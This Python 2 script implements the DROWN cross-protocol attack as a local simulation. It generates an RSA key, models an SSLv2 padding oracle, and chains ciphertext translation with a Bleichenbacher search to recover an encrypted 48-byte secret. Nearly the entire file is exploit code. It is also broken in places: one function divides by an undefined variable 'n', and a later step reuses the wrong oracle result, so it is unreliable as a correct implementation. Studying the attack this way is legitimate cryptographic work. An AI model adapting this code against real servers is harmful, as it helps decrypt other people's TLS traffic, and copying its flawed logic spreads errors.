import sys
import random
import binascii
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    g, y, x = egcd(b%a,a)
    return (g, x - (b//a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('No modular inverse')
    return x%m

KEYLEN = 1024
RSA_key = RSA.generate(KEYLEN)
cipher = PKCS1_v1_5.new(RSA_key)
inv2 = modinv(2, RSA_key.n)
B = pow(2, KEYLEN - 16, RSA_key.n)
B2 = (2 * B) % RSA_key.n
B3 = (3 * B) % RSA_key.n
R = pow(2, 48, RSA_key.n)
R_inverted = modinv(R, RSA_key.n)
pow40 = pow(2, 40, RSA_key.n)
inv40 = pow(inv2, 40, RSA_key.n)
inv40e = pow(inv40, RSA_key.e, RSA_key.n)
fraction = modinv(8, RSA_key.n)
fraction = (fraction * 7) % RSA_key.n
fraction = pow(fraction, RSA_key.e, RSA_key.n)	

def generate_random_string(size):
	string = ""
	for i in range(0, size):
		string += chr(random.randint(0, 255))
	return string

def string_to_base_10(data):
	return int(binascii.hexlify(data), 16)

def base_10_to_string(number):
	hex_num = hex(number)[2:-1]
	l = len(hex_num)
	if l != (KEYLEN / 4):
		hex_num = ((KEYLEN / 4) - l)*'0' + hex_num
	return binascii.unhexlify(hex_num)

def SSLv2_oracle(ciphertext):
	plaintext = cipher.decrypt(ciphertext, "Err")
	if plaintext == "Err":
		return False
	if 5 != len(plaintext):
		return False
	return plaintext[-5:]	

def check_translatable_ciphertext(ciphertext):
	number = string_to_base_10(ciphertext)
	number = (number * fraction) % RSA_key.n
	ciphertext = base_10_to_string(number)
	oracle_return = SSLv2_oracle(ciphertext)
	if oracle_return != False:
		return ciphertext, oracle_return
	return False, False

def get_new_sample():
	secret_key = generate_random_string(48)
	return cipher.encrypt(secret_key)

def find_translatable_ciphertext():
	i = 0
	while True:
		ciphertext = get_new_sample()
		new_cipher, oracle_return = check_translatable_ciphertext(ciphertext)
		i += 1
		if new_cipher != False:
			print "Compatible ciphertext found in " + str(i) + " attempts:"
			return ciphertext, new_cipher, oracle_return

def find_conformant_cyphertext(old_ciphertext, known_plaintext):
	old_ciphertext = (old_ciphertext * pow(R_inverted, RSA_key.e, RSA_key.n)) % RSA_key.n
	known_plaintext = (known_plaintext * R_inverted) % RSA_key.n
	s = 1073741824
	queries = 0
	while True:
		MSB = (known_plaintext * s) % RSA_key.n
		if MSB > B2 and MSB < B3:
			queries += 1
			power = pow(s, RSA_key.e, RSA_key.n)
			new_cipher = base_10_to_string((old_ciphertext * power) % RSA_key.n)
			oracle_return = SSLv2_oracle(new_cipher)
			if oracle_return != False:
				print "Found in " + str(queries) + " queries"
				return new_cipher, (s * R_inverted) % RSA_key.n, oracle_return	
		s -= 1

def bleichenbacher(ciphertext):
	s = (modinv(B2, RSA_key.n) * RSA_key.n) % RSA_key.n
	i = 1
	M = [(B2, B3 - 1)]
	while True:
		if i == 1 or (i > 1 and len(M) > 1):
			while True:
				new_cipher = (ciphertext * pow(s, RSA_key.e, RSA_key.n)) % RSA_key.n
				if SSLv2_oracle(new_cipher) != False:
					break
		else:
			(a, b) = M[0]
			r = 2 * ((b * s) - B2) / RSA_key.n
			while True:
				s1 = (B2 + r * RSA_key.n) / b
				s2 = (B3 + r * RSA_key.n) / a
				for s in range(s1, s2):
					new_cipher = (ciphertext * pow(s, RSA_key.e, RSA_key.n)) % RSA_key.n
					if SSLv2_oracle(new_cipher) != False:
						break
				r += 1
		Mn = []
		for (a, b) in M:
			min_r = (a * s - B3 + 1) / n
			max_r = (b * s - B2) / n
			for r in range(min_r, max_r + 1):
				new_a = max(a, (B2 + r * RSA_key.n) / s)
				new_b = min(b, (B3 - 1 + r * RSA_key.n) / s)
				if new_b >= a:
					Mn.append((new_a, new_b))
		M = Mn
		if len(M) == 1:
			(a, b) = M[0]
			if a == b:
				return a
		i += 1

def DROWN_attack():
	c0, c1, oracle_return1 = find_translatable_ciphertext()
	known_plaintext_1 = B2 + string_to_base_10(oracle_return1)
	c2, s1, oracle_return2 = find_conformant_cyphertext((string_to_base_10(c1) * inv40e) % RSA_key.n, known_plaintext_1)
	known_plaintext_2 = B2 + string_to_base_10(oracle_return2)
	c3, s2, oracle_return3 = find_conformant_cyphertext((string_to_base_10(c2) * inv40e) % RSA_key.n, known_plaintext_2)
	known_plaintext_3 = B2 + string_to_base_10(oracle_return2)
	c4, s3, oracle_return4 = find_conformant_cyphertext(string_to_base_10(c3), known_plaintext_3)
	m4 = bleichenbacher(string_to_base_10(c4))
	m3 = (m4 * modinv(s3, RSA_key.n)) % RSA_key.n
	m2 = (m3 * modinv(s2, RSA_key.n) * pow40) % RSA_key.n
	m1 = (m2 * modinv(s1, RSA_key.n) * pow40) % RSA_key.n
	m0 = (m1 * 8 * modinv(7, RSA_key.n)) % RSA_key.n
	return base_10_to_string(m0)

def main(args):
	m = DROWN_attack()
	print m	 	

if __name__ == '__main__':
    main(sys.argv)